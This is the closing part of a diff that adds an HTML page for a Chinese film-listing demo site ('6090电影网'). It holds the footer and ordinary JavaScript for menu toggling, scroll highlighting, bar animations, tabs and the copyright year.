+      © <span id="yr">2026</span> <b>6090电影网</b> · 6090dianyingwang-cn &nbsp;|&nbsp; 网址：https://6090dianyingwang-cn.github.io &nbsp;|&nbsp; 本页为演示用单页示例，内页链接以 # 占位。影视作品版权归原作者及发行方所有。
+    </div>
+  </div>
+</footer>
+
+<a class="top" id="topBtn" href="#top" aria-label="回到顶部">↑</a>
+
+<script>
+/* 菜单 */
+var burger=document.getElementById('burger'),nav=document.getElementById('navlinks');
+burger.addEventListener('click',function(){
+  nav.classList.toggle('open');
+  burger.setAttribute('aria-expanded',nav.classList.contains('open'));
+  burger.textContent=nav.classList.contains('open')?'✕':'☰';
+});
+nav.addEventListener('click',function(e){
+  if(e.target.tagName==='A'){nav.classList.remove('open');burger.setAttribute('aria-expanded','false');burger.textContent='☰';}
+});
+
+/* 滚动高亮 */
+var links=document.querySelectorAll('.navlinks a'),ids=['decade','genre','rank','auteur','show','about'];
+var secs=ids.map(function(i){return document.getElementById(i);});
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+130,cur='';
+  secs.forEach(function(s){if(s&&s.offsetTop<=y)cur=s.id;});
+  links.forEach(function(a){a.classList.toggle('act',a.getAttribute('href')==='#'+cur);});
+  document.getElementById('topBtn').classList.toggle('show',window.scrollY>800);
+},{passive:true});
+
+/* 数据条动画（IntersectionObserver） */
+if('IntersectionObserver' in window){
+  var io=new IntersectionObserver(function(es){
+    es.forEach(function(e){
+      if(e.isIntersecting){
+        e.target.querySelectorAll('.fill').forEach(function(f){
+          f.style.width=f.dataset.w+'%';
+        });
+        io.unobserve(e.target);
+      }
+    });
+  },{threshold:.35});
+  document.querySelectorAll('.bar2').forEach(function(b){io.observe(b);});
+}
+
+/* Tabs */
+document.querySelectorAll('.tabs').forEach(function(g){
+  g.addEventListener('click',function(e){
+    if(!e.target.classList.contains('btn'))return;
+    g.querySelectorAll('.btn').forEach(function(t){t.classList.remove('btn-fill');});
+    e.target.classList.add('btn-fill');
+  });
+});
+
+document.getElementById('yr').textContent=new Date().getFullYear();
+</script>
+</body>
+</html>
